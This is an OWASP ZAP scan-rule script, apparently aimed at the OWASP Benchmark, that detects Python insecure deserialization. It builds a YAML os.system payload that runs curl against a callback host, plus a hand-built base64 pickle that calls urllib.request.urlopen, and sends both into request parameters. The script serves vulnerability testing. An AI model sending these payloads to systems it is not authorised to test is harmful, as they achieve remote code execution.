const ScanRuleMetadata =
    Java.type("org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata");
const Control =
    Java.type("org.parosproxy.paros.control.Control");
const ExtensionOast =
    Java.type("org.zaproxy.addon.oast.ExtensionOast");
const Alert =
    Java.type("org.parosproxy.paros.core.scanner.Alert");

const Base64 = Java.type("java.util.Base64");
const StringCls = Java.type("java.lang.String");

/* ===================== METADATA ===================== */

function getMetadata() {
    return ScanRuleMetadata.fromYaml(`
id: 89002
name: Python Insecure Deserialization (OWASP Benchmark)
description: >
  Detects insecure Python deserialization vulnerabilities (CWE-502)
  using YAML unsafe load and pickle.loads(base64.urlsafe_b64decode()).
  Successful exploitation is confirmed via OAST callback.
category: INJECTION
risk: HIGH
confidence: MEDIUM
solution: >
  Do not deserialize untrusted data. Avoid pickle and unsafe YAML loaders.
cweId: 502
status: alpha
`);
}

/* ===================== OAST ===================== */

var extOast = Control.getSingleton()
    .getExtensionLoader()
    .getExtension(ExtensionOast.class);

/* ===================== PAYLOADS ===================== */

/* -------- Payload 1: YAML unsafe load -------- */
function payloadYaml(canary) {
    return (
`!!python/object/apply:os.system
- "curl ${canary}/yaml"
`);
}

function buildPickleBinary(url) {
    var ByteArrayOutputStream = Java.type("java.io.ByteArrayOutputStream");
    var ByteBuffer = Java.type("java.nio.ByteBuffer");
    var ByteOrder = Java.type("java.nio.ByteOrder");
    var StringCls = Java.type("java.lang.String");

    var out = new ByteArrayOutputStream();

    // === PROTO 4 ===
    out.write(0x80);
    out.write(0x04);

    // === FRAME ===
    var frameStart = out.size();
    out.write(0x95);
    out.write([0,0,0,0,0,0,0,0]); // placeholder

    var frameContentStart = out.size();

    // === 'urllib.request' ===
    var mod = new StringCls("urllib.request").getBytes("UTF-8");
    out.write(0x8c);
    out.write(mod.length);
    out.write(mod);
    out.write(0x94);

    // === 'urlopen' ===
    var fn = new StringCls("urlopen").getBytes("UTF-8");
    out.write(0x8c);
    out.write(fn.length);
    out.write(fn);
    out.write(0x94);

    // === STACK_GLOBAL ===
    out.write(0x93);
    out.write(0x94);

    // === URL ===
    var urlBytes = new StringCls(url).getBytes("UTF-8");
    out.write(0x8c);
    out.write(urlBytes.length);
    out.write(urlBytes);
    out.write(0x94);

    // === TUPLE1 ===
    out.write(0x85);
    out.write(0x94);

    // === REDUCE ===
    out.write(0x52);
    out.write(0x94);

    // === STOP ===
    out.write(0x2e);

    // === FIX FRAME LENGTH ===
    var frameEnd = out.size();
    var frameLen = frameEnd - frameContentStart; // MUST be 79

    var frameLenBytes = ByteBuffer
        .allocate(8)
        .order(ByteOrder.LITTLE_ENDIAN)
        .putLong(frameLen)
        .array();

    var buf = out.toByteArray();
    for (var i = 0; i < 8; i++) {
        buf[frameStart + 1 + i] = frameLenBytes[i];
    }

    return buf;
}

/* -------- Payload 2: Pickle + urlsafe Base64 (JS encoded) -------- */
function payloadPickleBase64(canary) {
    var binary = buildPickleBinary(canary);    
    return Java.type("java.util.Base64")
        .getUrlEncoder()
        .encodeToString(binary);
}

/* ===================== SCAN ===================== */

function scan(as, msg, param, value) {

    if (!extOast || !extOast.getCallbackService()) {
        print("[ERR] OAST service not available");
        return;
    }

    print("[*] Testing param: " + param);
    var baseMsg = msg.cloneRequest();
    var alert = as.newAlert()
        .setRisk(Alert.RISK_HIGH)
        .setConfidence(Alert.CONFIDENCE_MEDIUM)
        .setMessage(baseMsg)
        .setParam(param)
        .setSource(Alert.Source.ACTIVE)
        .build();

    var canary =
        extOast.registerAlertAndGetPayloadForCallbackService(
            alert,
            "BOAST"
        );

    print("[*] OAST Canary: " + canary);
    
    var payloads = [
        { name: "YAML Unsafe Load", data: payloadYaml(canary) },
        { name: "Pickle Base64 (OWASP Benchmark)", data: payloadPickleBase64(canary) },        
    ];
    print(JSON.stringify(payloads, null, 2));

    payloads.forEach(p => {
        var attackMsg = msg.cloneRequest();
        as.setParam(attackMsg, param, p.data);
        as.sendAndReceive(attackMsg, false, false);
        print("[OK] Sent payload: " + p.name);
    });

    print("[✓] Waiting for OAST callbacks...");
}